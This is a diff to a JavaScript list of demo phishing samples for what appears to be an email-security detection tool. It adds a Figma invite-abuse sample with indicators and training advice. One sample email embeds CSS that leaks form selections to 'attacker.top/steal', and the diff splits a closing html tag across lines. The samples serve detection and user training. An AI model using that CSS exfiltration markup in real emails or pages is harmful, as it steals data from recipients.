@@ -2870,7 +2870,54 @@ const DEMO_SAMPLES = [
       },
       bodyHighlights: 'position:fixed, :has(option:checked), @font-face, unicode-range, attacker.top'
     },
-    raw: `From: security@booking-notify.top\nTo: yanaivanov@gmail.com\nSubject: Your booking requires verification\nDate: Sun, 17 Aug 2026 09:00:00 -0500\nX-Originating-IP: 185.234.218.47\nMIME-Version: 1.0\nContent-Type: text/html\n\n<html>\n<style>\ndiv { position: fixed; top: 0; left: 0; width: 100%; height: 100%; }\ndiv:has(option:checked) { background: url('https://attacker.top/steal?data=') }\n@font-face {\n  font-family: 'tracker';\n  unicode-range: U+0030-0039;\n  descent-override: 200%;\n}\n</style>\n<body>\n<select style="-webkit-text-security: disc; appearance: none;">\n  <option value="a">a</option>\n  <option value="b">b</option>\n</select>\n<label for="RibbonModeToggle">Click here to verify your booking</label>\n<p>Your booking has been flagged for security review. Please verify your account immediately to avoid cancellation.</p>\n</body>\n</html>`
+    raw: `From: security@booking-notify.top\nTo: yanaivanov@gmail.com\nSubject: Your booking requires verification\nDate: Sun, 17 Aug 2026 09:00:00 -0500\nX-Originating-IP: 185.234.218.47\nMIME-Version: 1.0\nContent-Type: text/html\n\n<html>\n<style>\ndiv { position: fixed; top: 0; left: 0; width: 100%; height: 100%; }\ndiv:has(option:checked) { background: url('https://attacker.top/steal?data=') }\n@font-face {\n  font-family: 'tracker';\n  unicode-range: U+0030-0039;\n  descent-override: 200%;\n}\n</style>\n<body>\n<select style="-webkit-text-security: disc; appearance: none;">\n  <option value="a">a</option>\n  <option value="b">b</option>\n</select>\n<label for="RibbonModeToggle">Click here to verify your booking</label>\n<p>Your booking has been flagged for security review. Please verify your account immediately to avoid cancellation.</p>\n</body>\n</htm
+l>`
+  },
+  {
+    id: 'demo10', label: 'CRITICAL', risk: 'critical',
+    title: 'Figma Platform Phishing — Invite Abuse',
+    desc: 'A legitimate Figma file invite from a first-contact sender. The email passes every authentication check — it comes from no-reply@email.figma.com, SPF and DMARC pass, the link goes to figma.com. Inside the project is a hidden phishing link. No suspicious content in the email itself.',
+    analysis: {
+      risk: 'critical', threatType: 'Credential Phishing',
+      summary: 'Figma platform abuse via the legitimate file invite system. The email originates from no-reply@email.figma.com — Figma\'s own notification infrastructure — and passes all authentication checks. The sender has no prior contact history with the recipient. The Figma project linked in the email contains a secondary phishing link or credential theft overlay. This is a confirmed attack pattern documented in Figma community forums (August 2026): attackers use Figma\'s invite system to deliver phishing at scale from a trusted domain that bypasses standard email security controls.',
+      iocs: [
+        {category:'infrastructure', type:'Platform Abuse', description:'Email sent from no-reply@email.figma.com — Figma\'s legitimate notification domain. SPF, DKIM, and DMARC all pass. Standard sender reputation checks show no risk. The trusted platform is the attack vector.', example:'From: no-reply@email.figma.com', severity:'high'},
+        {category:'infrastructure', type:'First Contact', description:'Sender has no prior benign contact history with recipient. Legitimate Figma collaborators typically have an established relationship before sharing files.', example:'profile.by_sender().prevalence: new', severity:'high'},
+        {category:'url', type:'Figma Project Link', description:'Link goes to figma.com — a legitimate domain. Standard URL reputation checks pass. The malicious content is inside the Figma project, not in the URL itself.', example:'https://www.figma.com/design/[file-key]/Untitled', severity:'medium'},
+        {category:'infrastructure', type:'No Prior Relationship', description:'Figma file invite from a sender with zero prior benign messages. Legitimate design collaborations typically involve prior email contact, Slack messages, or meeting invites before a Figma share arrives.', example:'profile.by_sender_email().days_since.first_contact < 3', severity:'high'}
+      ],
+      mitre: ['T1566.002 Spearphishing Link — Figma Invite Infrastructure Abuse', 'T1583.006 Acquire Infrastructure: Web Services — Figma Free Tier', 'T1036.005 Match Legitimate Name or Location — Trusted Platform Domain'],
+      training: {
+        title: 'Trusted platform, malicious intent — the new phishing normal',
+        explanation: 'This email would pass every standard security check: the sender domain is real, authentication headers are valid, and the link goes to figma.com. The only signal is context — a Figma file invite from someone you have never interacted with. Legitimate design collaborators contact you through other channels before sharing Figma files. An unsolicited invite from an unknown sender deserves the same scrutiny as any cold email. Reference: yanaivanov.com/writing/figma_field_note.html',
+        redFlags: [
+          'Figma invite from someone you have never emailed, Slacked, or met',
+          'No prior context — no project discussion, no job posting, no mutual introduction',
+          'Urgency language in the email subject or body ("Action required", "Please review immediately")',
+          'Sender email does not match the name of anyone in your network',
+          'Project name is generic ("Untitled", "New file", "Review this")'
+        ]
+      },
+      bodyHighlights: 'no-reply@email.figma.com, figma.com/design, first contact, no prior relationship'
+    },
+    raw: `From: Figma <no-reply@email.figma.com>
+To: target@company.com
+Subject: Someone shared a Figma file with you
+Date: Sat, 23 Aug 2026 14:22:11 -0400
+DKIM-Signature: v=1; a=rsa-sha256; d=email.figma.com
+Authentication-Results: dmarc=pass; spf=pass; dkim=pass
+
+Hi,
+
+Alex Chen has shared a Figma file with you.
+
+View file: https://www.figma.com/design/aB3xY9kL2mN/Q3-Brand-Review?node-id=0-1
+
+You can view, comment, and inspect this file.
+
+The Figma Team
+
+If you didn't expect this invitation, you can ignore this email.`
   }
 ]
 
